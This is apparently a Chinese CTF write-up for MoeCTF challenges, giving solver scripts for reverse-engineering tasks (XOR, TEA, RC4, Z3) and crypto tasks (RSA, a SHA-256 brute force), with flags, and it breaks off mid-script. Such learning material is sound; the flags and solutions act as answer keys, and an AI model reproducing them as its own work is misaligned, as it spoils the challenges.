src="/./img/49277317_56sT9tyEdE0sMAIs/1727256719374-7eba993c-c3fa-4ae0-9af1-7f37484d7db7-695223.png" alt="1727256719374-7eba993c-c3fa-4ae0-9af1-7f37484d7db7.png"></p><p>ls &#x2F;tmp -a 显示所有的文件，包括临时文件</p><p>使用通配符*省略后面的字符</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727256778393-dbb1eafe-d58d-48e7-8137-9beeba8b078f-876243.png" alt="1727256778393-dbb1eafe-d58d-48e7-8137-9beeba8b078f.png"></p><h2 id="moejail-lv2"><a href="#moejail-lv2" class="headerlink" title="moejail_lv2"></a><strong>moejail_lv2</strong></h2><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h2><p>安装phpstudy</p><p><a href="https://old.xp.cn/download.html">Windows版phpstudy下载 - 小皮面板(phpstudy) (xp.cn)</a></p><p>本地搭建网站</p><p><a href="https://www.bilibili.com/video/BV1Wk4y1u7As/?spm_id_from=333.337.search-card.all.click&vd_source=076e1e9de2e61963283715e603d3511c">一个视频教会你，如何在本地搭建php网站服务环境_哔哩哔哩_bilibili</a></p><p>创建一个目录，然后将www网站html放入目录中创建本地网站，访问local即可</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726649056395-466e38b3-a8b4-477d-8561-ae5fd5960ee7-291327.png" alt="1726649056395-466e38b3-a8b4-477d-8561-ae5fd5960ee7.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1726649033149-d4233996-6fd9-4f88-b4ca-733b43ce3e02.png"></p><h2 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726648305354-71c4c6e6-08c4-4a73-9453-0c5904f8df6f-780147.png" alt="1726648305354-71c4c6e6-08c4-4a73-9453-0c5904f8df6f.png"></p><p>使用dirsearch扫描不出来</p><p>访问robots.txt</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726713885657-34c34ae4-bc26-4ea4-8d83-31fb26a56128-048950.png" alt="1726713885657-34c34ae4-bc26-4ea4-8d83-31fb26a56128.png"></p><p>访问他给的地址拿到flag</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726713913723-be0ad96f-387a-4153-8da7-4ebaf58ab313-792487.png" alt="1726713913723-be0ad96f-387a-4153-8da7-4ebaf58ab313.png"></p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727011298547-ea72743a-3a21-4235-8e36-5c1653a42c24-366530.png" alt="1727011298547-ea72743a-3a21-4235-8e36-5c1653a42c24.png"></p><h2 id="垫刀之路01-MoeCTF？启动！（env查看环境变量"><a href="#垫刀之路01-MoeCTF？启动！（env查看环境变量" class="headerlink" title="垫刀之路01: MoeCTF？启动！（env查看环境变量)"></a>垫刀之路01: MoeCTF？启动！（env查看环境变量)</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726714080107-480c1886-1892-4979-8cd1-f99bb9aac24f-012299.png" alt="1726714080107-480c1886-1892-4979-8cd1-f99bb9aac24f.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726714153130-f47be931-3f19-44a0-9b04-fe42ec430fd1-386362.png" alt="1726714153130-f47be931-3f19-44a0-9b04-fe42ec430fd1.png"></p><p>查看根目录即可</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726714165241-aeffbd31-3eed-4282-94fb-b0a4f036bcbe-558773.png" alt="1726714165241-aeffbd31-3eed-4282-94fb-b0a4f036bcbe.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726714203277-69ab34f4-de23-48d3-b431-8b82da9ab99b-231082.png" alt="1726714203277-69ab34f4-de23-48d3-b431-8b82da9ab99b.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727011454324-90ae74df-471b-45e6-8091-3e17f4b0e7cb-800488.png" alt="1727011454324-90ae74df-471b-45e6-8091-3e17f4b0e7cb.png"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="入门签到"><a href="#入门签到" class="headerlink" title="入门签到"></a>入门签到</h2><p>运行代码就行</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1723266265930-dddee807-3a55-4d64-af2c-e0957d70f018-510938.png" alt="1723266265930-dddee807-3a55-4d64-af2c-e0957d70f018.png"></p><p>moectf{r3v3rs3_1s_a_long_long_way_to_explore}</p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1723266705734-6d86aade-d37c-417c-a743-b48c36b06770-892675.png" alt="1723266705734-6d86aade-d37c-417c-a743-b48c36b06770.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1723266714965-1d9da034-05a5-4205-9bd9-fcc1c19e7638-437059.png" alt="1723266714965-1d9da034-05a5-4205-9bd9-fcc1c19e7638.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[<br>  0x49, 0x4B, 0x41, 0x47, 0x50, 0x42, 0x5F, 0x41, 0x1C, 0x16, <br>  0x46, 0x10, 0x13, 0x1C, 0x40, 0x09, 0x42, 0x16, 0x46, 0x1C, <br>  0x09, 0x10, 0x10, 0x42, 0x1D, 0x09, 0x46, 0x15, 0x14, 0x14, <br>  0x09, 0x17, 0x16, 0x14, 0x41, 0x40, 0x40, 0x16, 0x14, 0x47, <br>  0x12, 0x40, 0x14, 0x59, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,<br>  0x00, 0x00, 0x00, 0x00, 0x00, 0x00<br>]<br>for i in range(45):<br>    a[i]=a[i]^0x24<br>    print(chr(a[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1723266727527-866f5a57-a6b4-4b62-9ec6-520d91b9915a-180537.png" alt="1723266727527-866f5a57-a6b4-4b62-9ec6-520d91b9915a.png"></p><h2 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726642932368-574baca7-1124-45f9-abd4-d4925f95f898-725708.png" alt="1726642932368-574baca7-1124-45f9-abd4-d4925f95f898.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726642990433-5a170871-5a96-44db-b762-1e08dc5134b1-803769.png" alt="1726642990433-5a170871-5a96-44db-b762-1e08dc5134b1.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726643012124-a8db036b-028e-4c44-bd42-8f693d7fece4-935500.png" alt="1726643012124-a8db036b-028e-4c44-bd42-8f693d7fece4.png"></p><h2 id="upx-revenge"><a href="#upx-revenge" class="headerlink" title="upx-revenge"></a><strong>upx-revenge</strong></h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726643360296-fbbef47e-04fb-4b99-a110-5d3231bf4318-366045.png" alt="1726643360296-fbbef47e-04fb-4b99-a110-5d3231bf4318.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726643456954-8be1277e-aa8c-408e-b5bc-d6b873b2c5a7-237839.png" alt="1726643456954-8be1277e-aa8c-408e-b5bc-d6b873b2c5a7.png"></p><p>正常应该是UPX</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726643497007-c4f9abd1-e8ad-49ba-92c4-57ef7062f42b-335503.png" alt="1726643497007-c4f9abd1-e8ad-49ba-92c4-57ef7062f42b.png"></p><p>改回来解壳</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726643582467-fad79ea7-7699-4eec-a342-1da4a4efb23f-196860.png" alt="1726643582467-fad79ea7-7699-4eec-a342-1da4a4efb23f.png"></p><h2 id="dynamic"><a href="#dynamic" class="headerlink" title="dynamic"></a>dynamic</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726643099442-c91e576d-24ef-4291-ad00-6de349a14fe8-056148.png" alt="1726643099442-c91e576d-24ef-4291-ad00-6de349a14fe8.png"></p><p>下个断点，动调一下</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726987143901-052b3f11-71ba-448c-b15f-d61ebfd117a5-524793.png" alt="1726987143901-052b3f11-71ba-448c-b15f-d61ebfd117a5.png"></p><p>点开看一下v7</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726987310029-48032f96-7550-40c8-b748-618a6b579e2d-158385.png" alt="1726987310029-48032f96-7550-40c8-b748-618a6b579e2d.png"></p><p>发现里面存储着flag</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726987330244-250ac6bd-21e8-4c5e-94fe-dfbd276eef40-662554.png" alt="1726987330244-250ac6bd-21e8-4c5e-94fe-dfbd276eef40.png"></p><p>shift12提取一下</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726987360595-8b5a5145-aedd-4266-aaf6-69554fb6f766-886155.png" alt="1726987360595-8b5a5145-aedd-4266-aaf6-69554fb6f766.png"></p><p>moectf{18d4c944-947c-4808-9536-c7d34d6b3827}</p><h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726643812405-a42d33f7-8ba8-49cf-9604-cb20c1bdecf7-958602.png" alt="1726643812405-a42d33f7-8ba8-49cf-9604-cb20c1bdecf7.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727016381228-766ad074-e0b9-4061-93a7-010b47e6a8cc-573427.png" alt="1727016381228-766ad074-e0b9-4061-93a7-010b47e6a8cc.png"></p><p>单独的xyz在十六进制下都是一位，算半字节，&lt;&lt;16左移两字节</p><p>四字节x 四字节y+z</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727016579620-cb864a29-a69e-4b62-b51f-bb4d236c1287-504743.png" alt="1727016579620-cb864a29-a69e-4b62-b51f-bb4d236c1287.png"></p><p>前面是4个密钥</p><p>cmp比较最终的密文</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;stdio.h&gt;   //836153A5  8E00  49BD 注意大小写！<br>#include &lt;stdint.h&gt;   //moectf&#123;836153a5-8e00-49bd-9c42-caf30620caaf&#125;<br><br>#define DELTA 0x61C88647<br><br>void tea_decrypt(uint32_t *v, uint32_t *key) &#123;<br>    uint32_t v0 = v[0], v1 = v[1];<br>    uint32_t sum = 0-DELTA * 32; // 32 轮解密<br>    for (int i = 0; i &lt; 32; i++) &#123;<br>        v1-=(v0+sum)^(16*v0+key[2])^((v0&gt;&gt;5)+key[3]);<br>        v0-=(v1+sum)^(16*v1+key[0])^((v1&gt;&gt;5)+key[1]);<br>        sum += DELTA;<br>    &#125;<br>    v[0] = v0;<br>    v[1] = v1;<br>&#125;<br><br>int main() &#123;<br>    uint32_t v[2] = &#123;0x284C2234, 0x3910C558&#125;; // 加密后数据<br>    uint32_t key[4] = &#123;0x65736162, 0x6F783436, 0x61657472, 0x61657478&#125;; // 密钥<br><br>    printf(&quot;Encrypted: %08X %08X\n&quot;, v[0], v[1]);<br>    tea_decrypt(v, key);<br>    printf(&quot;Decrypted: %08X %08X\n&quot;, v[0], v[1]);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727017772006-9f5f317b-b1b9-40f0-b26c-cf33b077fdd9-750031.png" alt="1727017772006-9f5f317b-b1b9-40f0-b26c-cf33b077fdd9.png"></p><p>moectf{xxxxxxxx-yyyy-zzzz-9c42-caf30620caaf}</p><p>moectf{836153A5-8E00-49BD-9c42-caf30620caaf}</p><p>moectf{836153a5-8e00-49bd-9c42-caf30620caaf}（改成小写就对了）</p><h2 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727017974921-e370957a-c7bf-4389-ae8e-724efeeb66f3-492069.png" alt="1727017974921-e370957a-c7bf-4389-ae8e-724efeeb66f3.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727018034143-e3e4105e-be5a-4e12-8ca1-59434541ba12-239296.png" alt="1727018034143-e3e4105e-be5a-4e12-8ca1-59434541ba12.png"></p><p>moectf{your key}</p><h2 id="d0tN3t"><a href="#d0tN3t" class="headerlink" title="d0tN3t"></a><strong>d0tN3t</strong></h2><p>用ilspy打开</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726980125001-19c92b60-bd67-4b97-a953-0dbb1b1af9ee-585982.png" alt="1726980125001-19c92b60-bd67-4b97-a953-0dbb1b1af9ee.png"></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = [173, 146, 161, 174, 132, 179, 187, 234, 231, 244,<br>     177, 161, 65, 13, 18, 12, 166, 247, 229, 207,<br>     125, 109, 67, 180, 230, 156, 125, 127, 182, 236,<br>     105, 21, 215, 148, 92, 18, 199, 137, 124, 38,<br>     228, 55, 62, 164]<br>x = len(a)<br>b = []<br><br>for i in range(x):<br>    b.append((((a[i] ^ (i * i)) ^ 0x72) - 114)%128)<br>&quot;要使得ascll在0-127内，所以要取余128，否则会输出乱码&quot;<br><br><br>for i in range(x):<br>    print(chr(b[i]), end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p>取余前：</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726980749913-f5518d4a-3910-488c-ba48-7ea5f0676f4e-840424.png" alt="1726980749913-f5518d4a-3910-488c-ba48-7ea5f0676f4e.png"></p><p>取余后</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726980735185-097e057f-0c20-4d62-8675-91b90b4b7e11-605442.png" alt="1726980735185-097e057f-0c20-4d62-8675-91b90b4b7e11.png"></p><h2 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726985624038-95ebd59e-44f5-46cc-bddf-919007a294ac-974694.png" alt="1726985624038-95ebd59e-44f5-46cc-bddf-919007a294ac.png"></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import ARC4<br>import binascii<br><br># 十六进制字符串<br>hex_data = &quot;A71A68ECD82711CC8C9B16155CD2673E82ADCE75D4BC5756C28A52B86BD6CCF8A4BA722FE05715B92411&quot;<br><br># 将十六进制字符串转换为字节<br>ciphertext = binascii.unhexlify(hex_data)<br><br># RC4 密钥（假设你知道密钥）<br>key = b&#x27;RC4_1s_4w3s0m3&#x27;  # 替换为你的RC4密钥<br><br># 创建 RC4 解密对象<br>cipher = ARC4.new(key)<br><br># 解密数据<br>plaintext = cipher.decrypt(ciphertext)<br><br># 输出解密后的内容<br>print(plaintext.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))<br></code></pre></td></tr></table></figure><h2 id="babe-ze3（不会）"><a href="#babe-ze3（不会）" class="headerlink" title="babe-ze3（不会）"></a>babe-ze3（不会）</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726988237493-5d29586e-eb89-4aa3-8aa8-6893b9f7b8d0-926494.png" alt="1726988237493-5d29586e-eb89-4aa3-8aa8-6893b9f7b8d0.png"></p><p>先脱壳</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726988449299-2134c22d-c2a5-4353-8577-a74dafbacf54-008589.png" alt="1726988449299-2134c22d-c2a5-4353-8577-a74dafbacf54.png"></p><p>网站Hint最后一个if有问题，狗屁通说v4和  !(_DWORD)v4无法同时成立</p><p>之前Z3解密用的都是Ints类型，这次运算有变，变成<font style="color:rgb(38, 38, 38);background-color:rgb(245, 245, 245);">BitVec()位向量</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs plain">from libnum import n2s<br>from z3 import *<br>from Crypto.Util.number import *<br><br># 定义变量<br>s = BitVec(&#x27;s&#x27;, 64)<br>v6 = BitVec(&#x27;v6&#x27;, 64)<br>v7 = BitVec(&#x27;v7&#x27;, 64)<br>v8 = BitVec(&#x27;v8&#x27;, 64)<br>solver = Solver()<br><br># 添加条件<br>solver.add((v7 &amp; s &amp; v8 | (~(v6 | s) | v6 &amp; v7) &amp; v6 &amp; s) == 0x2024243035302131)<br>solver.add((v6 ^ (v7 &amp; (s + v7) | v8 &amp; ~(v7 &amp; s) | v6 &amp; (v6 + v8) &amp; ~s)) == 0x7071001344417B54)<br>solver.add(((v7 - v8) ^ (s - v6)) == 0x3FE01013130FFD3)<br>solver.add((s + v7 - v8 + v6) * (v8 + s + v6 - v7) == 0x1989A41A9049C5C9)<br>solver.add((v7 + v6 + s + v8) % 0x1BF52 == 21761)<br>solver.add(v8 * v7 * v6 * s % 0x1D4B42 == 827118)<br><br># 检查是否有解<br>if solver.check() == sat:<br>    model = solver.model()<br><br>    # 输出变量的解<br>    s_val = model[s].as_long()<br>    v6_val = model[v6].as_long()<br>    v7_val = model[v7].as_long()<br>    v8_val = model[v8].as_long()<br><br>    # 将解转换为字符串<br>    print(&quot;s:&quot;, n2s(s_val))<br>    print(&quot;v6:&quot;, n2s(v6_val))<br>    print(&quot;v7:&quot;, n2s(v7_val))<br>    print(&quot;v8:&quot;, n2s(v8_val))<br>else:<br>    print(&quot;No solution found&quot;)<br><br># 处理字符串翻转<br>s = &#x27;cd5250c9dbc4fdab1760517947e35495&#x27;<br>s1 = &#x27;&#x27;<br>for i in range(0, 32, 8):<br>    a = s[i:i+8]<br>    a = a[::-1]  # 翻转每个8字符的子串<br>    s1 += a<br><br>print(&quot;Processed string:&quot;, s1)<br># 结果应为: 9c0525dcba4fdfbd9715067159453e74<br></code></pre></td></tr></table></figure><p>moectf{9c0525dcbadf4cbd9715067159453e74}</p><h2 id="xor（大嘘）"><a href="#xor（大嘘）" class="headerlink" title="xor（大嘘）"></a>xor（大嘘）</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726987905448-1595b5fc-62d4-41fc-a2b1-9bbcb3efac5a-774759.png" alt="1726987905448-1595b5fc-62d4-41fc-a2b1-9bbcb3efac5a.png"></p><h2 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727018380275-357adee9-b13d-4903-ac9b-63c4d5f70130-999357.png" alt="1727018380275-357adee9-b13d-4903-ac9b-63c4d5f70130.png"></p><p>脱壳</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727018649437-459f50c8-4c68-4dc7-9bad-b15730001d37-413496.png" alt="1727018649437-459f50c8-4c68-4dc7-9bad-b15730001d37.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727018480783-4f11e358-1c20-4d40-bee5-3debeeab8b18-605632.png" alt="1727018480783-4f11e358-1c20-4d40-bee5-3debeeab8b18.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="入门指北"><a href="#入门指北" class="headerlink" title="入门指北"></a>入门指北</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">import gmpy2<br>from Crypto.Util.number import long_to_bytes<br><br><br>e = 0x10001<br># n=8518969207529636389484032230886536704406768047371377256638626913642749445259329340941109791553519452501892180150380956873522604338824472473236167891564393<br><br># print(n)<br>n = 40600296529065757616876034307502386207424439675894291036278463517602256790833<br>p = 197380555956482914197022424175976066223<br>q = 205695522197318297682903544013139543071<br>c = 36450632910287169149899281952743051320560762944710752155402435752196566406306<br>d = gmpy2.invert(e, (p - 1) * (q - 1))<br>print(&quot;d=&quot;, d)<br>m = pow(c, d, n)<br>print(m)<br>print(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="signin-1"><a href="#signin-1" class="headerlink" title="signin"></a>signin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Util.number import inverse, long_to_bytes<br>from sympy import symbols, solve<br><br># 已知值<br>c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746<br>pq = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462<br>qp = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860<br>n = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903<br>p_q = 279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496<br>e = 65537<br><br># 恢复 p 和 q<br>p, q = symbols(&#x27;p q&#x27;, integer=True)<br>solutions = solve([<br>    p * q - n,<br>    p + q - p_q,<br>    (p-1)*(q-2) - pq,<br>    (q-1)*(p-2) - qp,<br>], [p, q])<br><br>p, q = solutions[0]<br><br># 转换为标准的 Python int 类型<br>p = int(p)<br>q = int(q)<br><br>print(f&quot;Recovered p: &#123;p&#125;&quot;)<br>print(f&quot;Recovered q: &#123;q&#125;&quot;)<br><br># 计算 φ(n)<br>phi_n = (p - 1) * (q - 1)<br><br># 计算 d (私钥指数)<br>d = inverse(e, phi_n)<br><br># 解密消息<br>m = pow(c, d, n)<br>flag = long_to_bytes(m)<br>print(f&quot;Decrypted flag: &#123;flag.decode()&#125;&quot;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1723350438811-a50e0309-26fd-4c28-b9c6-ec7c3daafe6c-264188.png" alt="1723350438811-a50e0309-26fd-4c28-b9c6-ec7c3daafe6c.png"></p><h2 id="ez-hash"><a href="#ez-hash" class="headerlink" title="ez_hash"></a>ez_hash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">from hashlib import sha256<br>from secret import flag, secrets<br><br>assert flag == b&#x27;moectf&#123;&#x27; + secrets + b&#x27;&#125;&#x27;<br>assert secrets[:4] == b&#x27;2100&#x27; and len(secrets) == 10<br>hash_value = sha256(secrets).hexdigest()<br>print(f&quot;&#123;hash_value = &#125;&quot;)<br># hash_value = &#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plain">import itertools<br>import hashlib<br>from concurrent.futures import ThreadPoolExecutor<br><br># 已知条件<br>known_prefix = b&#x27;2100&#x27;<br>target_hash = &#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;<br>total_length = 10<br><br># 计算剩余字节的长度<br>remaining_length = total_length - len(known_prefix)<br><br># 定义可能的字符集（限制为数字）<br>charset = &#x27;0123456789&#x27;<br><br># 定义多线程的工作函数<br>def hash_crack(candidate_suffix):<br>    potential_secret = known_prefix + candidate_suffix.encode()<br>    hash_value = hashlib.sha256(potential_secret).hexdigest()<br>    if hash_value == target_hash:<br>        return potential_secret<br>    return None<br><br># 使用多线程进行暴力破解<br>def main():<br>    with ThreadPoolExecutor(max_workers=8) as executor:  # 使用 